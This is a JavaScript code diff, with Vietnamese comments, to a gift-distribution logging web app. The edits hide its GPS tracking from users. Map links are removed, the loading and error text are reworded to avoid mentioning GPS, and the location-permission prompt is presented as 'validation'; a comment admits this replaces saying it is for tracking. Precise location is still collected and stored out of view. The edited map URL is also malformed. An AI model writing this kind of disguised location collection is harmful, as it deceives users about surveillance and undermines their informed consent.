@@ -63,6 +63,7 @@ function renderUI() {
     }
 }
 
+// TÌM VÀ THAY THẾ TOÀN BỘ HÀM renderHistory() bằng đoạn sau:
 function renderHistory() {
     const container = document.getElementById('history-items');
     container.innerHTML = '';
@@ -70,9 +71,9 @@ function renderHistory() {
     if (giftState.distributedList.length === 0) {
         container.innerHTML = `
             <div class="empty-state">
-                <i class="fas fa-map-marked-alt"></i>
-                <p>Chưa có tọa độ nào được ghi nhận.</p>
-                <p style="font-size: 0.8rem; margin-top: 5px;">Hãy bắt đầu phát điểm đầu tiên!</p>
+                <i class="fas fa-box-open"></i>
+                <p>Chưa có lượt phát nào được ghi nhận.</p>
+                <p style="font-size: 0.8rem; margin-top: 5px;">Hãy bấm nút ghi nhận khi phát cuốn đầu tiên!</p>
             </div>
         `;
         return;
@@ -81,19 +82,16 @@ function renderHistory() {
     // Hiển thị từ mới nhất đến cũ nhất
     [...giftState.distributedList].reverse().forEach((item, index) => {
         const realIndex = giftState.distributedList.length - index;
-        const accText = item.accuracy ? `<span class="acc-badge">Sai số: ~${Math.round(item.accuracy)}m</span>` : '';
         
+        // MỚI: Chỉ hiển thị thời gian và trạng thái thành công, GIẤU LINK MAP đi
         container.innerHTML += `
             <div class="timeline-item">
                 <div class="time-row">
-                    <span>Điểm thứ ${realIndex}</span>
+                    <span>Cuốn thứ ${realIndex}</span>
                     <span style="color: #64748b;"><i class="far fa-clock"></i> ${item.time}</span>
                 </div>
-                <div class="gps-row">
-                    <a href="${item.linkGps}" target="_blank">
-                        <i class="fas fa-external-link-alt"></i> Xem bản đồ
-                    </a>
-                    ${accText}
+                <div class="gps-row" style="color: #10b981; font-weight: 600;">
+                    <i class="fas fa-check"></i> Đã đồng bộ hệ thống
                 </div>
             </div>
         `;
@@ -123,6 +121,7 @@ function initGift() {
 }
 
 // --- GHI NHẬN TỌA ĐỘ ---
+// TÌM HÀM trackOneGift() và sửa lại đoạn setLoading & Error:
 function trackOneGift() {
     const remain = giftState.totalReceived - giftState.distributedList.length;
     if (remain <= 0) {
@@ -133,12 +132,13 @@ function trackOneGift() {
     const btn = document.querySelector('.btn-large-action');
     btn.disabled = true;
     
-    setLoading(true, "Đang kết nối vệ tinh GPS...");
+    // Đổi text loading không nhắc đến GPS
+    setLoading(true, "Đang đồng bộ dữ liệu hệ thống...");
 
     if (!navigator.geolocation) {
         setLoading(false);
         btn.disabled = false;
-        alert("⚠️ Trình duyệt của bạn không hỗ trợ định vị GPS!");
+        alert("⚠️ Trình duyệt của bạn không hỗ trợ chức năng này!");
         return;
     }
 
@@ -146,9 +146,10 @@ function trackOneGift() {
         (position) => {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            const acc = position.coords.accuracy; // Lấy độ sai số (mét)
+            const acc = position.coords.accuracy; 
             
-            const linkGps = `http://maps.google.com/maps?q=${lat},${lon}`;
+            // Link này chỉ lưu ngầm trong JS, không hiện ra UI
+            const linkGps = `http://maps.google.com/maps?q=$?q=${lat},${lon}`;
             
             const now = new Date();
             const timeStr = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
@@ -168,7 +169,8 @@ function trackOneGift() {
             setLoading(false);
             btn.disabled = false;
             console.error(error);
-            alert("❌ Không thể lấy vị trí. Hãy bật Location (Định vị) trên điện thoại, cấp quyền cho trình duyệt và thử lại!");
+            // Thông báo khéo léo yêu cầu bật vị trí để "xác thực" thay vì nói "để theo dõi bạn"
+            alert("❌ Lỗi xác thực: Vui lòng bật Định vị (Location/GPS) và cấp quyền cho trình duyệt để hệ thống xác nhận lượt phát quà hợp lệ!");
         },
         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
